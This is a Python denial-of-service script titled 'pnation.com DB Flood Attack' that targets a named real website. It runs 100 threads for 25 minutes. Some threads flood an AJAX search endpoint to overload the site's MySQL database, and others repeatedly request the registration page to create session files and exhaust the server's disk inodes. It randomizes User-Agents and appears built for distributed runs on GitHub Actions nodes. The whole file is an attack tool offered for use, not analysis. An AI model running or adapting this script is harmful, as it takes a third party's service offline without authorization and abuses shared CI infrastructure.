#!/usr/bin/env python3
"""
pnation.com DB Flood Attack
============================
Target: https://pnation.com
Strategy: ① ajax.filter.php DB queries + ③ Session flood
Duration: 25 minutes (GitHub Actions 6hr limit safe)
Threads: 40 (ajax) + 60 (session) = 100 total
"""

import requests
import threading
import time
import random
import string
import os
from concurrent.futures import ThreadPoolExecutor, as_completed

TARGET = "https://pnation.com"
DURATION = 25 * 60  # 25 minutes in seconds
THREADS_AJAX = 40
THREADS_SESSION = 60

# Stats
stats = {
    "ajax_requests": 0,
    "ajax_errors": 0,
    "session_requests": 0,
    "session_errors": 0,
    "start_time": 0,
}
stats_lock = threading.Lock()

# Session pool
session_pool = []
session_pool_lock = threading.Lock()

def get_session():
    """Get or create a requests session with random UA"""
    with session_pool_lock:
        if session_pool:
            return session_pool.pop()
    
    sess = requests.Session()
    sess.headers.update({
        "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90,125)}.0.{random.randint(1000,9999)}.{random.randint(10,999)} Safari/537.36",
        "Accept": "*/*",
        "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
    })
    return sess

def return_session(sess):
    with session_pool_lock:
        if len(session_pool) < 100:
            session_pool.append(sess)

# ===========================
# Vector ①: ajax.filter.php DB Flood
# ===========================
def ajax_filter_flood():
    """Hammer ajax.filter.php with various queries to stress MySQL"""
    endpoints = [
        "/bbs/ajax.filter.php",
    ]
    
    # Various fsearch values to force DB lookups
    fsearch_values = [
        "test", "admin", "sql", "injection", "xss",
        "pnation", "security", "hack", "exploit", "web",
        "".join(random.choices(string.ascii_lowercase, k=random.randint(3, 15)))
        for _ in range(20)
    ]
    
    sess = get_session()
    try:
        while time.time() - stats["start_time"] < DURATION:
            endpoint = random.choice(endpoints)
            fsearch = random.choice(fsearch_values)
            
            # Different query params to trigger DB queries
            params = {
                "fsearch": fsearch,
                "page": str(random.randint(1, 100)),
                "bo_table": "free",
            }
            
            try:
                r = sess.get(
                    f"{TARGET}{endpoint}",
                    params=params,
                    timeout=5,
                )
                with stats_lock:
                    stats["ajax_requests"] += 1
            except requests.exceptions.Timeout:
                with stats_lock:
                    stats["ajax_errors"] += 1
            except Exception:
                with stats_lock:
                    stats["ajax_errors"] += 1
            
            # Minimal delay - full speed
            time.sleep(0.001)
    finally:
        return_session(sess)

# ===========================
# Vector ③: Session Flood
# ===========================
def session_flood():
    """Create massive PHPSESSID files to fill disk inodes"""
    
    while time.time() - stats["start_time"] < DURATION:
        sess = requests.Session()
        sess.headers.update({
            "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90,125)}.0.{random.randint(1000,9999)}.{random.randint(10,999)} Safari/537.36",
            "Accept": "*/*",
        })
        
        try:
            # Force PHP to create a new session file
            r = sess.get(
                f"{TARGET}/bbs/register.php",
                timeout=5,
            )
            with stats_lock:
                stats["session_requests"] += 1
        except requests.exceptions.Timeout:
            with stats_lock:
                stats["session_errors"] += 1
        except Exception:
            with stats_lock:
                stats["session_errors"] += 1
        
        # Create new session = new PHPSESSID file on server
        time.sleep(0.01)


# ===========================
# Status Reporter
# ===========================
def status_reporter():
    """Report stats every 30 seconds"""
    while time.time() - stats["start_time"] < DURATION:
        time.sleep(30)
        elapsed = time.time() - stats["start_time"]
        with stats_lock:
            total = stats["ajax_requests"] + stats["session_requests"]
            errors = stats["ajax_errors"] + stats["session_errors"]
        print(f"[{elapsed:.0f}s] Ajax: {stats['ajax_requests']} | Session: {stats['session_requests']} | Total: {total} | Errors: {errors}")


# ===========================
# Main
# ===========================
if __name__ == "__main__":
    node_id = os.environ.get("NODE_ID", "unknown")
    print(f"=== pnation.com DB Flood Attack - Node {node_id} ===")
    print(f"Target: {TARGET}")
    print(f"Duration: {DURATION}s ({DURATION//60} min)")
    print(f"Threads: {THREADS_AJAX} ajax + {THREADS_SESSION} session = {THREADS_AJAX + THREADS_SESSION} total")
    print(f"Start time: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 60)
    
    stats["start_time"] = time.time()
    
    threads = []
    
    # Start status reporter
    reporter = threading.Thread(target=status_reporter, daemon=True)
    reporter.start()
    
    # Start ajax filter flood threads
    for i in range(THREADS_AJAX):
        t = threading.Thread(target=ajax_filter_flood, daemon=True)
        t.start()
        threads.append(t)
    
    # Start session flood threads
    for i in range(THREADS_SESSION):
        t = threading.Thread(target=session_flood, daemon=True)
        t.start()
        threads.append(t)
    
    print(f"All {len(threads)} threads started. Running for {DURATION//60} minutes...")
    
    # Wait for duration or until all threads die
    time.sleep(DURATION)
    
    with stats_lock:
        total = stats["ajax_requests"] + stats["session_requests"]
        errors = stats["ajax_errors"] + stats["session_errors"]
    
    print("=" * 60)
    print(f"=== Attack Complete - Node {node_id} ===")
    print(f"Total Requests: {total}")
    print(f"Total Errors: {errors}")
    print(f"Ajax Requests: {stats['ajax_requests']}")
    print(f"Session Requests: {stats['session_requests']}")
